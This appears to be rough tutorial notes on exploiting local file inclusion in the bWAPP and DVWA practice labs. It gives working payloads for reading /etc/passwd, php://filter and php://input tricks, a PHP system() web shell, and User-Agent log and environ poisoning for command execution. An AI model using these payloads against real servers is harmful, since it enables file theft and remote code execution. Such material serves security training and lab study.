LFI

Basic local file inclusion

To perform basic attacks manipulate

http://192.168.1.101/bWAPP/rlfi.php?language=lang_en.php&action=go into 192.168.1.101/bWAPP/flfi.php?language=/etc/passwd

null byte:

 /etc/passwd%00
 
 Base64 encoded

 Now there is another way to exploit LFI when the security level is high and you are unable to view the PHP file content, and then use the following PHP function.

http://192.168.1.101/bWAPP/rlfi.php?language= php://filter/read=convert.base64-encode/resource=/etc/passwd



Use php://input

PHP Input

 Using PHP input function we will execute injected PHP code to exploit LFI vulnerability. With the help of hackbar I am going to perform this task in which first we need to load the URL of the targeted web page as you can see in the given screenshot.

http://192.168.1.101/bWAPP/rlfi.php?language=lang_en.php&action=go

Now manipulate above URL using PHP input function

http://192.168.1.101/bWAPP/rlfi.php?language=php://input&cmd=ls

 Then select the check box to enable Post data which will forward the post request and add cmd comment in given text area<?php system($_GET[‘cmd’]); ?>as shown in following screenshot, finally click on execute.

This will show directories of victim PC.


proc/self/version:



If the server is outdated then to exploit it through LFI we can include proc/self/environ file that stores User_Agent where we will place our PHP code for executing CMD command.

http://192.168.1.102/dvwa/vulnerabilities/fi/?page=proc/self/environ

Add cmd comment <?php system($_GET[‘cmd’]); ?> inside user_Agent and send the request with GET parameter  192.168.1.8/lfi/lfi.php?file=/var/www/apachae2/access.log&cmd=id as shown in the below image. 

